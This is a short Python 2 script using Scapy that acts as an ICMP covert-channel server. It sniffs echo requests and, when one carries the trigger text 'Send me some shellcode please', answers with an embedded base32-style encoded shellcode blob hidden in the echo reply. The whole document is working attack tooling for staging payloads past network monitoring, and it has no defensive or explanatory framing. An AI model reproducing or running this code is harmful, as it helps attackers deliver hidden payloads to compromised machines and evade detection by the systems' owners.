#!/usr/bin/python
from scapy.all import *
conf.verb = 0 # disable scapy send messages

shellcode = \
    "SC7TUISAAAABQITZJR2JSIWURQRNJAZC2SCSFXEKAPW5FCMMP7GHAKYPDBPQBCYIGBZ4GQDR7C6BJFPC2SCCFUEPAB2C"\
    "FUA6EFYB2EUAOQKCFUQGELLAQADU7DHREYWNELAHLDD7ZRYCWMDTYNAHDTRYDV6QBX36B3PUSHLYSYRNMCIAOTM2FQYS"\
    "4LLAOADU4LASFQDUEJIQSCIW23MFMVUUP74BMF6WULCLVYMXLKAGGYLOIAAAAFA2BRRNXYP76VXPQB2KQKNCTJLPM577"\
    "KTYBT4BKAPXYDVAW5UOE3SN5VAAU772VRWC3DDFZSXQZIA"

try :
    while True :
        try:
            # receive data
            data = sniff(filter="icmp", count=1, iface="eth0", prn=lambda x: x.summary())

            source = data[0][IP].src
            try:
                payload = data[0][Raw].load
                if payload:
                    print ' [ ] Payload: %s' % payload
                else:
                    raise exception
            except:
                print ' [!] No payload'
                pass
            srcid = data[0][ICMP].id  # set required ID from echo request
            srcseq = data[0][ICMP].seq  # set required SEQ from echo request

            ip = IP(dst=source) # set ip
            icmp = ICMP(type=0, id=srcid, seq=srcseq) # set icmp type to repsonse
            if payload == 'Send me some shellcode please':
                data = shellcode
            else:
                data = 'False'
            send(ip/icmp/data)
            continue

        except Exception, error:
            print ' [!] Error ::: %s' % error
            pass

except KeyboardInterrupt :
    print 'ctrl+c'
    exit(0)